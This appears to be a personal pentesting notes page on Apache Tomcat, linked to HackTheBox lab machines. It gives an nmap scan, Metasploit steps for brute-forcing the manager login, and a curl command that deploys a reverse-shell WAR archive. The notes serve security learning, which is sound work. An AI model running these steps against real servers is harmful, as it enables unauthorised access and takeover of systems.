# Apache Tomcat

<div class="row row-cols-lg-2"><div>

[Apache Tomcat](https://tomcat.apache.org/) is an open-source web server. It provides a Java HTTP web server environment in which Java code can run.

* [GitHub](https://github.com/apache/tomcat) <small>(7.1k ⭐)</small>
* [Documentation](https://tomcat.apache.org/tomcat-11.0-doc/index.html) <small>(⛪)</small>

The version 11 is still in development. The previous major versions are version 10 <small>(2021)</small>, version 9 <small>(2018)</small>, and version 8 <small>(2016)</small>.
</div><div>

A java web application can use either or both servlets and JSPs. A combination of both is the most common architecture.

* **Servlets** ☕: the whole logic is in Java
* **JSP** 🐲: html-like template files in which we can add Java logic to handle input and create interactive pages.

The admin panel to upload applications if usually at `/manager/html`. To upload an application, you need to package it as a WAR archive. Each app is deployed at a URI, and `index.jsp` is loaded by default <small>(else error)</small>.
</div></div>

<hr class="sep-both">

## Pentester Notes ☠️

[![jerry](../../../../../cybersecurity/_badges/htb-p/jerry.svg)](https://app.hackthebox.com/machines/Jerry)
[![cozyhosting](../../../../../cybersecurity/_badges/htb-p/cozyhosting.svg)](https://app.hackthebox.com/machines/CozyHosting)

<div class="row row-cols-lg-2"><div>

* You can use [nmap](/cybersecurity/red-team/tools/scanners/ports/nmap.md). It often runs on port 8080.

```shell!
$ sudo nmap 10.10.10.95 -sCV -v
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

* We can often easily recognize a website using Apache Tomcat from the presence of the `JSESSIONID` cookie while we may also trigger an error to see the error message page layout.

* If you have access to the manager, you can try to upload a reverse shell. Refer to [reverse shell#tomcat](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md#tomcat-reverse-shell) for more information.

* You can try [tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer) <small>(0.4k ⭐, 2022 🪦)</small>, but it's memory hungry, buggy, unstable, and you need to patch the code first 🪦.

* Maybe [Sprint Boot Actuators](/programming-languages/high-level/oo/java/others/boot/actuators.md) are being used.
</div><div>

* We can try to brute force the manager account using [metasploit](/cybersecurity/red-team/tools/frameworks/metasploit/index.md).

```shell!
$ msfconsole -q
msf6> use auxiliary/scanner/http/tomcat_mgr_login
msf6> set RHOSTS <target>
msf6> set STOP_ON_SUCCESS true
msf6> set ANONYMOUS_LOGIN true
msf6> set BLANK_PASSWORDS true
msf6> run
```

* You can also try to use metasploit to [upload a reverse shell](/cybersecurity/red-team/s3.exploitation/shell/reverse_shell.md#tomcat-reverse-shell)

* You can use cURL to upload a WAR too:

```ps
$ curl --upload-file revshell.war -u 'username:password' "URL/manager/text/deploy?path=/shell"
```
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

* [apache-tomcat-pentesting](https://exploit-notes.hdks.org/exploit/web/apache-tomcat-pentesting/)
* Jetty - it seems like an alternative
</div><div>
</div></div>